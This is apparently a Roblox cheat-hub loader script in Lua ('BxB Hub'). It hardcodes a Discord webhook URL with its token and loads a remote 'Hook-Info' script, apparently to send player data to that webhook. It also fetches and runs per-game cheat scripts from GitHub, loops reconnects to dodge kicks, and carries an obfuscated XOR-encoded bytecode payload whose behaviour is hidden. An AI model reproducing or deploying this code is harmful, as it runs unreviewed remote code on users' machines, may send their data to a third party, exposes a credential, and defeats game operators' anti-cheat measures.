
--// LoadTook
local ACL_LoadTime = tick()

if _G.BxB_xyz_Load ~= nil then
    repeat wait() until game.CoreGui:FindFirstChild('RobloxPromptGui')
 
local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')
 
po.ChildAdded:connect(function(a)
    if a.Name == 'ErrorPrompt' then
        repeat
            ts:Teleport(game.PlaceId)
            wait(2)
        until false
    end
end)

if not isfile("BxB_xyz_Warn\\Safe_Bypass.txt") then
	if _G.BxB_xyz_Load ~= nil then
		makefolder("BxB_xyz_Warn")
		writefile("BxB_xyz_Warn\\Safe_Bypass.txt", "[*] A safe function script can be run only once.")
		writefile("BxB_xyz_Warn\\Kick_Bypass.txt", "BxB.xyz Anti kick / Auto Reconnect...")
		return
	end
end

warn("A safe function script can be run only once.")
	return
end

_G.BxB_xyz_Load = false
if not game:IsLoaded() then
	game.Loaded:Wait()
end

getgenv().HOOKURL = "https://discordapp.com/api/webhooks/1022461875482546227/9qyDUp_jcvEL7fPIapkqdgfzjNYACyDOiL-CulXvFv6WCAHFVD6YXy9UA2R1mbjkmQFR"


if KRNL_LOADED then -- KRNL
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zzerexx/scripts/main/SynapseToKrnl.lua"))()
elseif import then -- Scriptware
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zzerexx/scripts/main/SynapseToScriptWare.lua", true))()
end
--//Hook 
loadstring(game:HttpGet("https://raw.githubusercontent.com/BxB-HUB/BxB-Hub-PremiumScript/main/BxB-Script/Discord/Webhook/Hook-Info.lua"))()
--// CheckGame
local OWNER = "https://raw.githubusercontent.com"
local DATA = "/BxB-HUB/BxB-Hub-PremiumScript/main/BxB-Script"
local Games = {
    [2753915549] = "/Blox-Fruit/Main/Script/Main.lua",
    [4442272183] = "/Blox-Fruit/Main/Script/Main.lua",
    [7449423635] = "/Blox-Fruit/Main/Script/Main.lua",
    [292439477] = "/Phantom-Forces/Main/BxB-Hub-PF-V2.lua",
    [286090429] = "/Arsenal/Main/Arsenal.lua",
    [9648883891] = "/Festival-Tycoon/UI-Script/FTT.lua",
    [8304191830] = "/Anime-Adventures/AAT.lua",
    [9284097280] = "/Apartment-Tycoon/APTC.lua",
    [4490140733] = "/My-Restaurant/MR.lua",
    [8737602449] = "/PLS-Donate/PLSDONATE.lua",
    [3956818381] = "/Ninja-Legends/NL.lua",
    [6284583030] = "/Pet-Simulator-X/BxB-Meow/Example.lua"
}
--// LoadScript
local Supported = Games[game.PlaceId] or false
if Supported ~= false then
    loadstring(game:HttpGet(OWNER..""..DATA..""..Supported))()
end
--// Notify

if not game.PlaceId == Supported then
    local hint = Instance.new("Hint", game.CoreGui)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    warn("Not a supported game")
    hint.Text = "This game is not supported"
    delay(
        5,
        function()
            hint:destroy()
        end
    )
--// ByteCode
    local r = string.byte
    local f = string.char
    local c = string.sub
    local X = table.concat
    local l = table.insert
    local u = math.ldexp
    local A = getfenv or function()
            return _ENV
        end
    local l = setmetatable
    local h = select
    local t = unpack or table.unpack
    local i = tonumber
    local function s(d)
        local e, n, o = "", "", {}
        local a = 256
        local t = {}
        for l = 0, a - 1 do
            t[l] = f(l)
        end
        local l = 1
        local function r()
            local e = i(c(d, l, l), 36)
            l = l + 1
            local n = i(c(d, l, l + e - 1), 36)
            l = l + e
            return n
        end
        e = f(r())
        o[1] = e
        while l < #d do
            local l = r()
            if t[l] then
                n = t[l]
            else
                n = e .. c(e, 1, 1)
            end
            t[a] = e .. c(n, 1, 1)
            o[#o + 1], e, a = n, n, a + 1
        end
        return table.concat(o)
    end
    local i =
        s(
        "25U25Y27525W26427525Y25625525324Y24L24I24K25B25424X25W27427524X25325724Z25W25T27924E24I24I24M24124Z24I25W24727925A27W24M24L26K26X26X24K25324H26W24X25B24I25A24J25024J24L24Z24K25125525424I24Z28S26W28Q25726X23P25725524U24E28K28Z29124U26Z24025B25624Z24L26X25725327I26X23L24Z25025A25525525927927526627925G25W27925Z29U27529Y29W27526U2A025Y29Y25X25Y25G2752A827M29R2A729R2AG25Y2A22AE2A62AH29Y275"
    )
    local o = bit and bit.bxor or function(l, e)
            local n, o = 1, 0
            while l > 0 and e > 0 do
                local c, a = l % 2, e % 2
                if c ~= a then
                    o = o + n
                end
                l, e, n = (l - c) / 2, (e - a) / 2, n * 2
            end
            if l < e then
                l = e
            end
            while l > 0 do
                local e = l % 2
                if e > 0 then
                    o = o + n
                end
                l, n = (l - e) / 2, n * 2
            end
            return o
        end
    local function n(e, l, n)
        if n then
            local l = (e / 2 ^ (l - 1)) % 2 ^ ((n - 1) - (l - 1) + 1)
            return l - l % 1
        else
            local l = 2 ^ (l - 1)
            return (e % (l + l) >= l) and 1 or 0
        end
    end
    local l = 1
    local function e()
        local c, e, n, a = r(i, l, l + 3)
        c = o(c, 214)
        e = o(e, 214)
        n = o(n, 214)
        a = o(a, 214)
        l = l + 4
        return (a * 16777216) + (n * 65536) + (e * 256) + c
    end
    local function d()
        local e = o(r(i, l, l), 214)
        l = l + 1
        return e
    end
    local function a()
        local e, n = r(i, l, l + 2)
        e = o(e, 214)
        n = o(n, 214)
        l = l + 2
        return (n * 256) + e
    end
    local function b()
        local l = e()
        local e = e()
        local c = 1
        local o = (n(e, 1, 20) * (2 ^ 32)) + l
        local l = n(e, 21, 31)
        local e = ((-1) ^ n(e, 32))
        if (l == 0) then
            if (o == 0) then
                return e * 0
            else
                l = 1
                c = 0
            end
        elseif (l == 2047) then
            return (o == 0) and (e * (1 / 0)) or (e * (0 / 0))
        end
        return u(e, l - 1023) * (c + (o / (2 ^ 52)))
    end
    local s = e
    local function u(e)
        local n
        if (not e) then
            e = s()
            if (e == 0) then
                return ""
            end
        end
        n = c(i, l, l + e - 1)
        l = l + e
        local e = {}
        for l = 1, #n do
            e[l] = f(o(r(c(n, l, l)), 214))
        end
        return X(e)
    end
    local l = e
    local function f(...)
        return {...}, h("#", ...)
    end
    local function s()
        local r = {}
        local c = {}
        local l = {}
        local i = {r, c, nil, l}
        local l = e()
        local o = {}
        for n = 1, l do
            local e = d()
            local l
            if (e == 0) then
                l = (d() ~= 0)
            elseif (e == 3) then
                l = b()
            elseif (e == 2) then
                l = u()
            end
            o[n] = l
        end
        i[3] = d()
        for l = 1, e() do
            c[l - 1] = s()
        end
        for i = 1, e() do
            local l = d()
            if (n(l, 1, 1) == 0) then
                local c = n(l, 2, 3)
                local t = n(l, 4, 6)
                local l = {a(), a(), nil, nil}
                if (c == 0) then
                    l[3] = a()
                    l[4] = a()
                elseif (c == 1) then
                    l[3] = e()
                elseif (c == 2) then
                    l[3] = e() - (2 ^ 16)
                elseif (c == 3) then
                    l[3] = e() - (2 ^ 16)
                    l[4] = a()
                end
                if (n(t, 1, 1) == 1) then
                    l[2] = o[l[2]]
                end
                if (n(t, 2, 2) == 1) then
                    l[3] = o[l[3]]
                end
                if (n(t, 3, 3) == 1) then
                    l[4] = o[l[4]]
                end
                r[i] = l
            end
        end
        return i
    end
    local function b(l, e, d)
        local n = l[1]
        local e = l[2]
        local l = l[3]
        return function(...)
            local a = n
            local e = e
            local o = l
            local f = f
            local n = 1
            local c = -1
            local u = {}
            local r = {...}
            local i = h("#", ...) - 1
            local l = {}
            local e = {}
            for l = 0, i do
                if (l >= o) then
                    u[l - o] = r[l + 1]
                else
                    e[l] = r[l + 1]
                end
            end
            local l = i - o + 1
            local l
            local o
            while true do
                l = a[n]
                o = l[1]
                if o <= 6 then
                    if o <= 2 then
                        if o <= 0 then
                            e[l[2]] = l[3]
                        elseif o > 1 then
                            local r
                            local u, h
                            local i
                            local o
                            e[l[2]] = d[l[3]]
                            n = n + 1
                            l = a[n]
                            e[l[2]] = d[l[3]]
                            n = n + 1
                            l = a[n]
                            o = l[2]
                            i = e[l[3]]
                            e[o + 1] = i
                            e[o] = i[l[4]]
                            n = n + 1
                            l = a[n]
                            e[l[2]] = l[3]
                            n = n + 1
                            l = a[n]
                            o = l[2]
                            u, h = f(e[o](t(e, o + 1, l[3])))
                            c = h + o - 1
                            r = 0
                            for l = o, c do
                                r = r + 1
                                e[l] = u[r]
                            end
                            n = n + 1
                            l = a[n]
                            o = l[2]
                            e[o] = e[o](t(e, o + 1, c))
                            n = n + 1
                            l = a[n]
                            e[l[2]]()
                            n = n + 1
                            l = a[n]
                            do
                                return
                            end
                        else
                            local n = l[2]
                            local o, l = f(e[n](t(e, n + 1, l[3])))
                            c = l + n - 1
                            local l = 0
                            for n = n, c do
                                l = l + 1
                                e[n] = o[l]
                            end
                        end
                    elseif o <= 4 then
                        if o > 3 then
                            e[l[2]] = d[l[3]]
                        else
                            e[l[2]] = l[3]
                        end
                    elseif o == 5 then
                        local o = l[2]
                        local n = e[l[3]]
                        e[o + 1] = n
                        e[o] = n[l[4]]
                    else
                        do
                            return
                        end
                    end
                elseif o <= 10 then
                    if o <= 8 then
                        if o == 7 then
                            local l = l[2]
                            e[l] = e[l](t(e, l + 1, c))
                        else
                            e[l[2]]()
                        end
                    elseif o > 9 then
                        e[l[2]]()
                    else
                        local o = l[2]
                        local n = e[l[3]]
                        e[o + 1] = n
                        e[o] = n[l[4]]
                    end
                elseif o <= 12 then
                    if o > 11 then
                        local n = l[2]
                        local o, l = f(e[n](t(e, n + 1, l[3])))
                        c = l + n - 1
                        local l = 0
                        for n = n, c do
                            l = l + 1
                            e[n] = o[l]
                        end
                    else
                        e[l[2]] = d[l[3]]
                    end
                elseif o > 13 then
                    local l = l[2]
                    e[l] = e[l](t(e, l + 1, c))
                else
                    do
                        return
                    end
                end
                n = n + 1
            end
        end
    end
    return b(s(), {}, A())()
end

--// END
print(string.format("BxB Hub  has loaded in %s seconds.", tostring(tick() - ACL_LoadTime):sub(1, 4)))
--// Stop exe script
_G.BxB_xyz_Load = true
